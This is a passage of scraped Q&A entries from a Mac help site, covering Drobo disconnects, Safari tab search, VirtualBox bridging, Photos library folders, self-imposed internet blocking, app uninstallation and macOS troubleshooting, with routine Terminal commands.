the data as aggressively as possible, and the Drobo ejected itself again.  I then ran a single rsync job to restore the data, and it did not disconnect.\nMy theory, is that Time Machine tends to backup when the computer is sleeping.  This backup is rather aggressive, unlike rsync, and that the Firmware in the Drobo is poorly written, resulting in buffer overflows, and thus the drive ejects itself.\nWhen the data stream is slow enough, this does not seem to happen, which supports this assertion.  If this is the case, 7200 RPM drives would more be desirable for the DAS even though 5400 RPM drives are the norm for longevity.  I do not have the drives to test this theory out, however, Drobo had suggested that although desktop drives are fine (mine are actually DVR drives), they recommend NAS drives, and the Seagate RED.\n\nA: The bad and the good cable looked identical but tech support could tell the difference with the part number on the cable.\nI had some initial teething pains with Drobo but it has been sold for the last couple of years.\n", "Q: How do I get Safari to search all tabs from all Safari windows in the Tab Overview, instead of only those in the current window? When I press the shiftcommand\\ keyboard shortcut, it goes into 'expose' mode and allows to search thru only the tabs in the current window, not all windows. \nIt would be super handy to be able to search/display tabs from all windows.\nIs there a way to do this?\n\nA: This extension: http://nickvdp.com/tablist/ does allow global search and is awesome. It would also be good if it included iCloud tabs.\nI would love it more if it could be invoked from the keyboard or integrated into Spotlight but it's still incredible. The way it just brings that tab+window directly to the front is beautiful.\n\nA: The shiftcommand\\ keyboard shortcut is used to toggle the Tab Overview option in Safari. This can also be accessed via the View > Show Tab Overview option via the menubar, or from the Show/Exit Tab Overview icon in the Toolbar.\nAs you've found, this only displays a visual thumbnail of all tabs from the current window, and not all tabs from all Safari windows.\nUnfortunately, there's no modifier key you can use to enhance this shortcut, but you may find an Extension that does what you want. Extensions don't necessarily work for all versions of Safari, so you may need to experiment a bit to see if one exists that can do what you want.\nYou can browse for Extensions in the Safari Extensions Gallery.\nFinally, you may want to submit some feedback to Apple requesting this feature. For example, you could suggest that including the option key in the shortcut (i.e. pressing optionshiftcommand\\) works to display all tabs from all windows.\nYou can submit Safari feedback here.\n\nA: \"Tabs Switcher\" from the App Store works great for me: https://apps.apple.com/us/app/tabs-switcher/id1406718335?mt=12\n\nA: The most immediate way would be to Window > Merge All Windows and then do View > Show Tab Overview\n\nA: Not a free solution, but there is an Alfred workflow that enables searching across all the tabs of all the windows in safari.

For inst. you cannot use Command+Shift+S, because Safari just opens \"Save page as\" on it.\nAnd in may case some other key combinations didn't work while Safari was active, but worked when some other applications were active, for inst. Command+Option+S, Command+Shift+F - when I was in Safari those shortcuts just didn't launch the script. One keys combination that worked for me in Safari is Command+Option+\\\nP.S. tablist (http://nickvdp.com/tablist/) was a good solution, too bad it's no longer working\n", "Q: VirtualBox: Bridged Connection Not Working - High Sierra I just bought my first Macbook today (long time Windows user) but I am running into issues loading in the .OVA of Rapid 7's \"Hackazon\" vulnerable web app into VirtualBox and getting a bridged connection so that I can scan it and connect to it. I know there are lots of these questions that have been posted about networking with VMs in other forms, but I have followed all of the suggestions from a dozen pages and nothing seems to work, and I would really like to not regret buying this machine. \nHere is my setup:\nVirtualBox Settings Screenshot:\n\nScreenshot of error on VM load\n\nScreenshot of ifconfig on the VM\n\nSince this is a brand new machine, are there any Mac permissions networking configurations that I should be aware of? Am I missing something dumb? This generally worked when I used VMs in the past on Windows.\nThanks in advance!\n\nA: Huh--strange! So it turns out that it was something with that particular .ova file. I just downloaded Ubuntu and it was able to bridge no problem. I guess that's something that I need to report to Rapid7.\n", "Q: Risk of altering folder structure in Apple Photos? I've used Apple iPhoto and now Photos for many years, and now have a library of about 32,000 photos and videos. Right now that library is on an attached drive with no rights, so family members can log in and see it.\nLooking through the bundle and 'Masters' folders, I see a lot of irregularities in folder names over the years, perhaps between versions, and where I imported other libraries they seemed to get placed in subfolders of the import day, rather than in a higher level date folder. There are also some other quirky things about date and folder location according to ExifTool which I'll look to fix later.\nI want to put all of these in a standard /year/month/day folder format as I may move to another app in the near future, but also to make them easier to track in my backups. \nI made some small changes and then rebuilt the database and all seemed well, but I want to ask if there is a known danger of loss of photos somehow due to the way Photos manages this. I didn't find much on the Apple site to explain how Photos does folder level organization (EXIF CreateDate?), since this is what Photos abstracts as part of its UI. \n\nA: Everything is named per the database and systems, so please resist the urge to move anything. \nYou can secure that data with an encrypted disk image if needed or encrypt the whole drive transparently with the current FileVault scheme if that’s what’s the main concern. \nUnless you want to export out the files to disk, I wouldn’t touch it. \nThe best tool for making sense / merging / duplicating photos is https://fatcatsoftware.com/powerphotos/ in my experience. \n", "Q: How do I change how often the Mac App Store in High Sierra checks for updates or notifies me about them? I feel like I constantly get notifications from the Mac App Store. I find this distracting and stressful and would like to change how often the Mac App Store checks for updates, or how often it notifies me of these updates. \nI know I can go into System Preferences and disable the automatic checking for updates, but I don’t want to do this as I’m not likely to remember to manually check for updates myself.\nIs it possible to check for updates less often or to get notified less?\n\nA: Yes, you can do this quite easily.\nBy default the Mac App Store app will check for updates once every week, but you can change this by running a terminal command. Follow these steps:\n\n*\n\n*Launch the Terminal app (by default it's located in the Utilities folder within your Applications folder)\n\n\n*Copy and paste the following command into your Terminal window:\ndefaults write com.apple.SoftwareUpdate ScheduleFrequency -int 7\n\n\n*The number at the end represents the number of days, so change the ‘7’ at the end to the number of days you’d prefer (i.e. if you change the ‘7’ to ’10’ then it’ll only check for updates every 10 days)\n\n\n*Press Enter\nAnd that’s it! The Mac App Store should now only check for updates as often as you set in the terminal command.\n", "Q: How stop my IDE from showing hidden files on Sierra?

I had this problem last year with one of my personal clients who wanted to use Outlook 2016 for his email instead of the Apple Mail app. There was no way that I could find to make Outlook switch from semi-colons to commas. I did a fair amount of research then (and did some additional research just now) but came up empty.\nIn the end, my client went back to Apple Mail.\nSorry I have nothing definitive.\n", "Q: Click and Type Applecript code not working I am making a service in Automator that runs the following AppleScript code: \non run {input, parameters}\n\n    tell application \"System Events\"\n        click at {393, 77}\n        delay 0.1\n        keystroke \"Hello\"\n        delay 0.1\n        keystroke return\n    end tell\n    return input\n\nend run\n\nIf you couldn't tell, I'm trying to click on something and type \"Hello\" there.

Assuming SIP will even let you, those are the fonts that ship with the Mac. Unless... have you installed some fonts there yourself?\nFonts should be stored in /Users/[USERNAME]/Library/Fonts.\nAnd you can safely remove any and all fonts from that directory, just leave the directory itself.\nIf you have been installing fonts in the /System folder you probably want to go in there and move the ones you installed there to your /Users fonts folder.

Update: the problem occurs using two different USB audio devices on two different ports with two different cables.\nI plug an audio device into a USB port on my 2014 MacBook Pro running High Sierra 10.13.3.  If I play a song in iTunes hosted locally on my hard drive, I hear audio for up to about 20 seconds.  Then iTunes continues playing, but no audio comes out of the device (the device is active and powered on and makes just enough background hiss that I know it's on).  If I play a video on YouTube in Chrome, I get up to a minute or so of audio, and then the video freezes (!).  In all of these cases the internal speakers work fine.\nIf I pull down the menu bar audio icon and select internal speakers and then re-select the USB audio device, the song comes through the USB audio device again.  I can't replay the frozen YouTube video.\nWhere can I begin to troubleshoot this?\nOriginal question:\nI have a Jabra 9470 Pro headset that I've had connected to my MacBook Pro for months if not years now.  Everything has been working fine up until a few days ago.\nThe base is plugged into the computer via its USB jack.  A few days ago, if I select the headset as the default audio device, audio sounds in it just fine for about six or seven seconds.  Then it goes silent.\nThe Mac continues to think that the Jabra base is the USB audio device and clearly thinks that it is successfully sending audio to it.\nAnother USB audio device works fine, so the problem is clearly somewhere in the macOS-to-Jabra-specifically path.\nI know that High Sierra has had some issues with USB audio in the past, but I can't understand what might have happened here.

Can this be done? \nIf this could be done if it weren't for the XQuartz rendering, I could switch to Skim (with a regular macOS window). I own BetterTouchTool and Alfred, if either might be useful in a way I have not thought of. \n\nA: You can achieve this by using multiple desktops on your Mac. \nStart off by going into mission control (either swipe up with 4 fingers on your trackpad or press the f3 key) and then move your cursor to the top left of the screen and press the plus button.

You can then add them back in one by one until you've identified the culprit. Problem solved.\n\n*If the problem does persist, it's either a problem with fonts you've installed yourself or with a 3rd party kernel extension. A little more info below:\n\n\nFonts:- You can remove any of the fonts you've installed yourself to see if this makes a difference.\nKernel Extensions:- You can open Terminal (found within your Utilites folder) and enter the following command:\nkextstat | grep -v com.apple\nThe above command will list 3rd party kernel extensions (you may need to stretch the Terminal window so it's easier to read). Look for anything you don't remember installing, or something that belongs to software you've removed, or just anything that looks out of place. Remember though, this is a list of 3rd party kernel extensions and therefore any of them could be causing the problem.\n", "Q: How to Unlock iPhone 6+ I own a company that had purchased two iPhone 6+ on a plan through Manitoba Telephone System. The company was asked to switch to Tellus Mobility which we did and upgraded to 8. An employee left the company and left his iPhone 6+ without passwords and pass codes. I the owner of this company have a use for this phone but I need to get it unlocked and am told i need to contact apple support in order to do this. Can someone point me in the proper direction please?\n\nA: This Apple page presents the steps to regain access to an iPhone that is otherwise out of reach because of an unknown passcode. You'll almost certainly lose whatever data is now stored on the phone.\nBasically, you'll have to erase the phone using iTunes or Recovery Mode. If you didn't make (or have access to) a backup, all the phone's settings and data will be lost. \nIf neither works, you can contact Apple and obtain assistance. You'll undoubtedly have to demonstrate that you or your firm is the original owner of the device.\nGood luck!\n", "Q: How do I create an encrypted APFS volume from the command-line?

According to my Geekbench 4 results, my discrete GPU Open CL score is ZERO.\nAdditionally, my discrete GPU Metal score is lower than that for the Iris Pro!\nDoes this mean my duscrete GPU is faulty?\nBelow are screenshots of my device and results, and here is a link to my Geekbench results online: https://browser.geekbench.com/v4/compute/2415138\n\n\n\n\nA: Short Answer\nYour discrete GPU is almost certainly fine. The reason for the zero score is that Geekbench is unable to fully test this GPU due to reduced NVIDIA support. Because it can't run a full test, you're getting a score of zero, but this does not mean your GPU is faulty.\nLong Answer\nAccording to your Geekbench results, you scored a Depth of Field result of zero because it measured 0.00 pixels/sec for that metric. In other words, Geekbench itself is unable to test this metric, rather than there being an issue with your discrete GPU.\nThis is a known issue. According to Primate Labs:\n\nThis is due to an issue with the NVIDIA GPU drivers provided with macOS. We’ve contacted Apple regarding this issue and Apple’s response is that they are unable to address the issue due to reduced NVIDIA support. \n\nSource: Primate Labs Support: Zero OpenCL Score\nI did check to see if there were any drivers you could download directly from NVIDIA, but non are available for macOS.\nSo, unless you're actually experiencing any problems using your MBP, I would just ignore this score altogether.\n", "Q: Latest max spec MBP15\" idle temperatures Please take a look at my thread with all the tests and troubleshooting done on Adobe's forum: https://forums.adobe.com/thread/2464657\nAlso, the screenshot while writing this post - Safari's 17 tabs, Slack, Airmail, Messages, TickTick and Spotify - had this \"setup\" opened in 93' Windows 3.1 and didn't hear any problems ;)\n\nShould I send back the MBP to Apple? What're your idle/non-idle temps? How often fans go crazy?\nIt was few hundreds bucks cheaper in this chain store. Apple guy from other shop told me the chain stores get worse manufacturing batches often.\n\nA: If you're not satisfied with the computer, and you can return it for a full refund - that seems like a good choice while you figure out what you want to do instead. This is no indication in itself however, that there's anything wrong with the computer hardware.\nBesides that your question and the accompanying forum threads seems to be incoherent:\n1) You experience high CPU load when using Lightroom. This is shown with screenshots of Activity Monitor showing high CPU load for Lightroom.\nThis is due to the programming of Lightroom. It is not a hardware error (!).\nThe posters on the forum saying that this is a cooling error are wrong. If the system was sensing a cooling problem and artifically making the CPU load higher due to this, it would have been attributed to kernel_task and not Lightroom.\n2) You write that you were using the same setup in '93. This doesn't ring true as services such as Slack and Spotify did not exist in 93, nor was tabbed browsing a thing... heck you would have been using Mosaic or similar at that time.\n3) As far as I know, chain stores get the exact same products as any other Apple vendor. There's no such thing as low-quality Apple batches being sold at chain stores at discount - at least nothing official. It might be that specific demo units or defective units can be sold as one-offs by a chain store, but they would have to advertise it as such. Advertising them as the real thing would be false advertising.\n4) It is unclear, but it seems your problem is that your hear fan noise when you think you're not really doing anything with the computer. Try starting the computer up in Recovery mode (hold down Cmd and R while booting the Mac). If you hear excessive fan noise here while the computer is running known good software and not doing anything, that would be an indication of hardware failure.\n", "Q: What is \"Setup\" process on activity monitor?

According to iTunes, on my iPhone 6 I have 6 Gb Photos, 2 Gb Apps, 1,4 Gb Documents & Data and 1,6 Gb of Other.

Caches will be cleared, but they will regenerate. \nIn iOS 11 Settings > General > iPhone Storage will give you recommendations as to how you can free up some space. \nYou can offload apps (delete the app but leave it's data, settings and icon) and you can store your photos in iCloud. \nYou can process your photos using something like JPEGmini or Half.app and regain some space. \nBut really you're fighting a losing battle. I recommend you upgrade to a larger capacity iPhone so you don't have to waste time and energy on keeping things just below capacity. \n\nA: This answer may not be very helpful as I cannot give you a definitive Yes or No, but my guess is no. After a google search I found this, and since at least voice memos probably get synced to itunes, I assume there is other stuff in the 'Other' category which gets synced as well.\nI once needed storage on my old iPhone 4S though, and clearing cookies helped. Be careful what cookies you clear though, some could be documents you worked on or something. Most of them, however, are just keys your browser and the website remember so you can tell the website them and you don't have to type in your password every time (not the same thing as saved passwords in browser) in other words they're when you close the window and reopen the webpage you'll still be logged on. Article on how to clear cookies by apple here.\n\nA: A tip that has worked for me several times was to rent a (very large) movie in the iTunes store directly on the phone. Your phone will try to make as much room as possible for the movie, but if the movie is really large, this will still not be enough. So the rental will fail and you have a lot of free space.\n", "Q: Possible to mount a RAID1 pair over USB? I have a pair of disks which I configured as RAID1 (mirrored) via Disk Utility on my Hackintosh.\nI am now traveling, and took the disks with me, and want to mount them with my MacBook Pro using a USB dock like this one.\nThe problem is that I cannot mount both disks at once. I can mount either one at a time. If I attach both, only one mounts, the other shows errors.\nAm I missing something? Is this possible?\n\nA: As from your replies to my comments you are trying to mount via USB two drives that are normally connected via SATA with a raid configuration.\nThis is not (AFAIK) possible with usb...\nI suggest you use one drive then, once home, you match the other drive to it then you can re-mount them via SATA and raid...\nThe only other option I can see is to buy another enclosure capable of raid and put them in there, but then that enclosure and the mackintosh would need to use the same algorithm for raid controls... unlikely...\n", "Q: On my iPhone I can't give my apps access to the camera, microphone, etc iOS Version: 11.3\nMy iPhone won’t allow me to give any apps camera, microphone, or library access.\nI’ve gone to their individual settings for the apps and there’s no options.

I’m the tech-savvy owner of a MacBook for which I have admin privileges. I have tried blocking Internet access for myself in the past but I always find ways to circumvent the block. So instead of that, I would like to find a way to make it as inconvenient as possible for me to re-enable. \nIs there any possible way in which I can make it absolutely and positively so that that Internet access is delayed for myself for a certain period of time? \n\nA: The most effective way to prevent a node (a workstation) from having Internet access is to stop it at the gateway.  \nWhy?  \nAnything that you can do as an admin can be undone by another admin.  However, if you block Internet access at the network level, an admin of a single node (your MacBook for example) cannot bypass that restriction (unless of course you give them admin access to the gateway).\nThat said, a very effective way to block Internet access is to route Internet (default) traffic back to the localhost (127.0.0.1).  \n$ sudo route delete default\n$ sudo route add default 127.0.0.1\n\nWhile not foolproof, it can deter a determined admin from figuring it out what's causing the block because the network appears to be operational as the internal network is still functional.  In other words, the user cannot browse the Internet, but still connect to local shares or use a network printer.\nThe caveat here is that to circumvent the block, you either reboot or just restart the network service.  However, you can have a LaunchDaemon that runs every minute ensuring this setting is persistent.\nWith this setup, the user is tricked into believing there's a problem with the network and not their machine.  Because even if they restart the network service, at most it will run for a minute, then stop.  If they were the present these symptoms to even the folks here on AD, the initial responses will be to look at the gatway.\nIt's not that you lock your door, it's the perception that your door is locked.\n", "Q: iOS 11.3.1 Mail app doesn't shown new mail until the iPhone is rebooted - any cure? I have an iPhone 6s running iOS 11.3.1.  The Mail app is able to download and display e-mail from my GMail account.  However, e-mail to my account at register.com is frequently not displayed until I have powered off the phone and powered it back on.  The webmail service at register.com shows that the e-mails have been received, and the iPhone actually shows a little message saying \"Downloading 5 of 5\" or whatever, but the e-mails never appear.\nWe all know that 11.3.1 is something of a failed release, but has anyone else experienced this problem and found a solution that doesn't involve turning the phone off and on to receive new mail?\n\nA: A couple of things to try\n\n\n*\n\n*Delete the Account from your phone and re add it.\n\n*Go into Settings > General > Reset and reset the network settings\n\n\nYou will lose the WiFi networks you have already been on and authenticated to but all you have to do is re-connect and re-authenticate.\n\n\n*Failing the above I would back up the phone (password protect the backup so you don't lose your saved passwords.) Wipe it (Settings > General > Reset > Erase all content and settings) and then restore from the backup you just made.\n\n", "Q: Is there any way to change the directory bash works out of, so as not to junk up my Home folder? Granted they’re generally invisible files, but it’s like every application wants to store a million configuration files in my home directory. I like to keep my home directory neat and tidy. Ideally I’d like to make a folder called bash and store all the bash, shell, etc files in there. Like every app leaves a trail of one line files in my nice, clean home directory.\nThis is my working directory:\n\nWhere I want it to look like this with a nice, neat little folder for the shell to do whatever it wants.\n\nAnyway... sorry if I sound pissy but I just got a new MacBook and I literally had to spend 40 minutes playing 52-pick-up in my home directory with all the files terminal apps left everywhere.\nI’m actually surprised Apple allows this. It just let’s the shall spill it’s crap all over the nice, neat home directory. I wish Apple would make it so you need a password to even create a directory there.\n\nA: \nIs there any way to change the directory bash works out of.....\n\nThis is a misunderstanding of what Bash is.  Bash is a Unix shell that's a command line interface to the operating system.  \nIt doesn't \"work out\" of your Home folder.  When you start a non-login, interactive shell, it starts you out in your HOME folder as a matter of convenience.\nFor simplicity sake, Bash is just a \"portal\" (Terminal window) into the operating system; nothing more.\n\n...so as not to junk up my Home folder?\n\nYour HOME folder is becoming \"junked up\" because whatever you're installing is using the default location $HOME for it's support files.\nJust looking at a sample of the files/folders, things like JUNK, New Folder with Items, doc, core, layers, news, etc. are either files created by applications sourced from somewhere other than the App Store or created by the user.\n\n...but it’s like every application wants to store a million configuration files in my home directory. \n\nApps usually store their files in ~/Library or more granular, in ~/Library/Application Support (this is the Library directory in the individual user's HOME directory).  There are exceptions...iCloud, and Adobe Create Cloud store files in the HOME directory.  I personally put my VirtualBox VM's in my HOME directory instead of my ~/Documents directory. \n\nI’m actually surprised Apple allows this.\n\nThank goodness they do!  I wouldn't welcome any OS that restricts me from modifying MY home directory the way I want it to.\nThat said, it's important to note that this is not an \"Apple thing.\"  This is a BSD and more generally a Unix thing.  Your HOME directory is a predefined variable in the OS and many applications and scripts use this directory to store it's files.\nAs stated before, App Store apps (the ones with oversight by Apple) conform to a standard place for their support files.  Things you download from Github...well, you're at their mercy.\n\n...Where I want it to look like this with a nice, neat little folder for\n  the shell to do whatever it wants.\n\nYou could do this, but bear in mind that the app you installed will be looking for it's support files in directory defined by the environment variable HOME.  Move those files somewhere else and you could break the app.  \nTo make this work, you would have to let the app know (by modifying it) that it's files are located in $HOME/bash.\nTL;DR\nYou're expecting HOME to be a pristine place that doesn't get touched; that's an ill conceived expectation.  Use the HOME directory for what it's designed for - a user support directory and focus on keeping ~/Documents, ~/Downloads, ~/Music, nice and clean.\n\nA: The short answer to your question is you cannot and the long answer is sort of. Let's lay some ground work. When you log on to your computer the loginwindow.app set up a basic environment setting HOME, PATH, TMPDIR, LOGNAME and USER.\nThe Terminal.app is a terminal emulator, in other words software that emulates a physical terminal. The environment variables set by the loginwindow.app are available to the Terminal.app. The Terminal.app then calls login which checks that HOME, PATH, LOGNAME and USER are set. Then starts the shell as a login shell reading the appropriate start up files. Up to this point HOME is static, set by the loginwindow.app, but within a terminal session the value of HOME can be changed.\nNow, copy your .bash_profile and .bashrc (or whatever shell config files you have) to /Users/chrisvaccaro/bash. Now, issue the following command:\nHOME=/Users/chrisvaccaro/bash; export HOME; exec bash -l\n\nFrom this point on bash_history will be written inside /Users/chrisvaccaro/bash along with any typical \"unix\" dot file. The initial terminal session will still leave some \"junk\" in the original HOME directory. \nThis is way too complicated and subject to breaking. \n", "Q: How to record a audio with iPhone via input cable like AUX from laptop I am trying to record a audio with iPhone via input cable like AUX from laptop\nBecause I have audio file to use for the voicemail greeting, So I need to record with good quality.I think if can play from the pc and get the sound trough cable can record it with good quality\n\nA: Actually all you need is an adapter cable that will provide the proper signals to the proper pins of the headphone jack. Note that if you have a phone without a headphone jack you will, first, need that lightning to headphone jack adapter that Apple sells.\nThe first thing I found was this article. It is much more than you were trying to do but it should work, none the less.\nThat article points to Amazon.com and a device called the Headset Buddy, which is nothing more than an adapter to go from a standard mini phono jack to the iPhone (and Android phone) headphone/mic jack.\nActually it may have some circuitry in it that does more than adapt a line-level input to your iPhone, not sure. No actual experience with this device.\nThe only thing I would be careful with (if you get the device linked above or something else comparable) is to start the output volume of your other device very low. I have experience with plugging stereos and the like into a Mac and the input level that a Mac and iPhone expect from a microphone is a lot lower than the output from your average audio out port on a PC or a stereo\n", "Q: Encrypt a DVD-RW? While I can create an encrypted thumb drive easily enough with Disk Utility, I wonder how can I create an encrypted DVD+R disc which, when I put it in the drive, causes MacOS to ask me for a password? \n\nA: Firstly, I feel it important to point out that requiring a password to open a folder or disk does not necessarily mean that it is encrypted. \nBased on your question, I actually think the best way to go would be to just create an encrypted (and password protected) disk image via Disk Utility and then burn this to your DVD+R disk. This doesn't mean that macOS will prompt the user for a password upon mounting the DVD, but it does mean that macOS will prompt for a password when a user tries opening the disk image.\nThere's a number of options you have in setting this up, but I'm going to assume that you're happy for all the files and folders to be located within a single folder.\nFollow these steps:\n\n\n*\n\n*If they're not already, place all your files and folders within a single folder\n\n*Launch Disk Utility\n\n*Press the ShiftCommandN shortcut (or go to File > New Image > Image from Folder...)\n\n*In the window that appears, navigate to the folder you placed everything into at Step 1, select it and click on Choose\n\n*Give your disk image a name\n\n*Note: By default your disk image will be saved to the same location as the folder you selected, but if you want to change this use the Where drop-down menu\n\n*Choose the encryption method you prefer from the Encryption drop-down list\n\n*Enter a password and enter it again to verify\n\n*Click on Choose\n\n*Choose the image format you prefer from the Image Format drop-down list\n\n*Click on Save\nNow you have an encrypted (and password protected) disk image file containing all the files and folders you wanted to protect. \nSimply burn this to your DVD+R (or other optical media) and no-one will be able to access these files without macOS first prompting them for a password.\nIMPORTANT: When you try to open the disk image, macOS will prompt you for a password. Below the password field is a checkbox if you want your Mac to remember the password in your keychain. Do not select this option before burning the disk image to disk and/or you want macOS to continue prompting you for a password! \n", "Q: Removed app is still available - how to remove it? I just removed Calibre app via Finder Cmd+Backspace. The app cannot be found via F4 key now. But it is still available via context menu \"open with\", even two versions there. So how app can be really removed?\nmacos 10.12.6\n\nA: If you are trashing an app manually, then you have to delete it's supporting files. Those could be in Application Support, Contextual Menu Items, Preferences, Receipts etc folders.\nUse apps like AppZapper to uninstall apps completely with all the related files. It's a paid app, but it works very well.\n\nA: To remove all entries in Finders \"Open with\" for apps that no longer exist, open Terminal and enter\n/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -kill -r -domain local -domain system -domain user\n\nThis takes a little while. Then enter\nkillall Finder\n\nAfter that, the invalid entries have been removed from the \"open with\" menu in Finder. This should work with in macOS versions.\nNote that the menu list needs to be rebuilt, so there might occur a slight delay when using it at first.\nUnfortunately, the \"open with\" entries in Finder are often left long after having deleted the app that is listed there. I think that's a bug in macOS.\n", "Q: Set maximum fan speed Is it possible to set the maximum computer fan speed on the latest Macs, ideally with Terminal?

When attempting to boot to a Leopard installer on a USB drive, I am greeted with a kernel panic. There is no specific error message but instead prompts me to restart.\nHowever, I tried booting from a hard drive in my early 2008 MacBook (with clean install of Lion) and it runs. However, there is extreme lag due to the high CPU usage. Task manager indicates kernel_task is using 150%+ of the CPU. This Lion install is near clean and runs perfectly on my MacBook. Upon successfully getting into Lion, I was greeted with a \"problem report for mac os x\". I can't copy paste it because of the lag (and I'm using a different machine to type this question) but one of the lines in the details suggests CPU issues...\npanic(cpu 0 caller 0x001A9C68): Kernel trap at 0x4c76a81c, type 14=page fault, registers. The next lines detail the registers and following that is a backtrace. I don't know what register and backtrace are.\nAlso, the computer is quite hot and there is no load. I performed a PRAM reset because, initially, the issues booting and no audio prompted me. Audio works now when it turns on.\nI'm concerned the CPU is failing on the motherboard but I'm curious about what you [the community] think. Does this involve reflowing/replacing the CPU? How can I fix this?\nI took photos of the kernel panic log window and the task manager. Upon request, I can post those.\n\nA: The line you have quoted is not an indication of CPU issues - you seem to be misinterpreting that.\nThe meaning of that line is that the kernel (i.e. the operating system core) failed because of a page fault. A page fault means that the operating system core tried to access a part of memory that isn't accessible to it (i.e. not mapped). This should not happen.\nThe causes of this are either a software bug or software incompatibility (for example if you run an operating system version earlier than the one originally supplied with the computer), or it is a hardware error. Usually the hardware error is due to defective RAM or insufficient cooling. \nPage faults caused by defective CPUs are extremely rare.\n", "Q: Assign function keys to umlauts I'm using Apple's wired keyboard with number pad.\n\nAbove the number pad there are 4 unassigned function keys (F16 to F19) which I would like to assign to the German umlauts ä, ö, ü and the sharp s ß.\nIs there a way to do that?\n\nA: It would be realizable with a -> Service. Such Automator Services are quite fast...but too slow for a smooth typing flow. However, there are third-party hotkey managers that are suitable for this.\n\n\n*\n\n*Butler: not updated for a long time, but very powerful and fast (and\nfree) \n\n*BetterTouchTool: quick and easy to use \n\n*Alfred: might be too slow \n\n*and many more...\n\n\nWith Butler you can execute text directly (!), with the others you might need an AppleScript. Open the Script-Editor to get the IDs for the umlauts:\nid of \"Ü\"\n\nThe necessary Applescript for \"Ü\" would then look like this:\ntell application \"System Events\" to keystroke (string id 220)\n\nAssign e.g. shift-F19 (because of capitalization)\n", "Q: How to use iPad as presenter for MacBook?

GlobalProtect VPN client refuses to uninstall the regular drag-app-to-trash way.\nTheir recommended method is to download the original .pkg installer and use its uninstall feature. This isn't always possible since GlobalProtect is branded to an organization and if you're no longer with that organization you can't download the installer.\nIs there a way to uninstall GlobalProtect without using the installer?\n\nA: One way is to run the uninstall script bundled inside the app:\nsudo /Applications/GlobalProtect.app/Contents/Resources/uninstall_gp.sh\n\n", "Q: Lag spikes when playing I have a good internet connection. \nThe problem comes when I play on Counter Strike: Global offensive. I have stable ping (5-25ms), but each 3-4 seconds i got lag spikes. It's like, I 'teleport' ingame. \nI've tested it with just my macbook on my network and with just CS:GO running.\nWhat may cause this problem?\n\nA: I can only generalise, as I don't know the game at all, but based on experience running helpline for another online structure...\nThis all assumes your Mac itself is up to the task & that you are running the most up to date OS. Game devs only concentrate on maintaining compatibility for so long, so as your machine or OS gets older, support dwindles.\nIf your machine only just meets 'minimum spec', then your gameplay is also going to be 'minimum spec' no matter how fast your connection is. \nOne thing to be very aware of is that most people think their computer is better than it is. The first thing they do is turn up the settings.\nDon't do that.\nRun at defaults, they're there for a purpose.\nYou need to find where the game's servers are & repeat that Speedtest. The Game's own support should be able to help you discover that, or you may be able to query from inside the game, Help/About... to find the IP address & track it down from there.\nYou can often find that even with a solid connection to local, you can see interference across much greater distances. From my own experience with the game host in Phoenix, AZ, anyone playing from Europe is likely to see ping of 150 - 250ms & easily 20-50% of their speed eaten by the distance.\nYou need to check what assets the game need to load from the remote servers. For some games it is little more than the positions of other players in real-time; everything else is already on your local disk. Some games download quite hefty assets, as the 'view' of your world changes each new 'view' has to be sent to you.\nThe larger the asset transmission, the more likely it is that this can get bound at your CPU [download/decode] which will cause the game to stutter.  \nDon't listen to anyone who tells you you need to clear any local asset caches to \"speed it up\"... it doesn't, it just means you have to re-download all those assets again, wasting time & bandwidth for you & the others sharing the same server.\nCheck your normal FPS. If you can get over 60 & the game has a frame limiter, cap it at 60. [this might need some testing, sometimes lower is better, 45 or even lower in extreme cases]. The less the GPU has to do, the more likely it will be able to keep up.\nDon't believe the hype from people who tell you that astronomical fps figures are needed. Online gaming is far more ping-reliant than fps.\nIf you see screen-tearing when panning, try to find a v-sync control in the game. v-sync is usually off, enabling it will make the GPU only update between frames. [You will never see this happen whichever way it's set, as it's all done behind the scenes, but it can reduce tearing.]\nOne that people forget - just because you can achieve good speeds over Speedtest doesn't mean your router isn't getting 'tired'. Domestic have brains the size of peanuts & are easily confused. They leave ports open that they should have closed, so the next time one's needed it has to re-negotiate. their routing tables get full & are constantly being flushed to make room for new data...\nSo...reboot all your network hardware, router/modem, any WiFi & hubs/switches... then your puter. Power off everything, wait at least 2 minutes, then power up one every 2 minutes, starting from 'nearest the outside word' inwards. Puter last.\nIf you are on Wifi & you can wire up instead, do so.\nOn a Mac, at reboot, set it not to reopen everything afterwards.\nRun just the game, nothing else. Browsers eat RAM & if you're in a low RAM scenario then you will start to see memory paging. This is good for the computer, but bad for your gaming experience.\n[If I can think of more generalisations, I'll come back & add them. I can't do specifics as I don't know the game.]\n\nA: I've finally found an answer:\nMacBook Pro experiencing ping spikes to local router\nI've done the following:\n\n*\n\n*Enable Wi-Fi logging\n\n*Perform ping: ping 8.8.8.8 -i 0.1\n\n*Check for changes on wifi log after ping spike: tail -f /var/log/wifi.log\n\n\nairportd[83093] Successful cache-assisted scan request for locationd\nairportd[83093] Successful cache-assisted scan request for megasync\n\nI've found two problems:\n\n*\n\n*One was locationd process, that was scanning for wi-fi.\n\n*Second was Megasync.

I waited a little bit and tried to move the arrow without success. Since I had to leave I forced shut down by keeping the Power button pressed for a few seconds. \nI've experienced a lot of lock-ups in Windows, and I had to force shutdown many times. Over time, the system became more and more unstable, until I had enough of that crap and decided to migrate to Mac. I've never experienced a single lock-up until today. Could the forced shutdown have consequences on the stability of my OS?\n\nA: At boot time a file consistency check is performed, usually a quick check to see if the filesystem was unmounted cleanly. If the filesystem is dirty (not unmounted cleanly) then some form of fsck is performed. fsck attempts to fix filesystem metadata not a files actual data. So, there is always the potential for data loss. fsck will not fix some inconsistencies and at some point a filesystem can become inconsistent and cannot be repaired. So, it is best to avoid hard shutdowns though the filesystem is not fragile.\n", "Q: Internet Accounts spontaneously forgets passwords and I can't reauthorize them I've had this problem before, but I was able to resolve it that time. macOS 10.13.4, everything up to date.

In my case, both LinkedIn and Facebook started prompting me for passwords on my MacBook, but (oddly enough) not on my iMac. \nI've since removed the login keychain items for both, and was able to re-authenticate to Facebook once (which created three login keychain items), only to be prompted again.\nNo such luck with LinkedIn, though. I get an error message with an un-clickable URL (with a long UUID).\nI suspect that either Apple has some sort of subtle date bug or that both services broke their APIs somehow (GDPR might explain the near simultaneity).\n", "Q: How can I reduce the 70 GB of storage that is classified as system space on my MacBook?

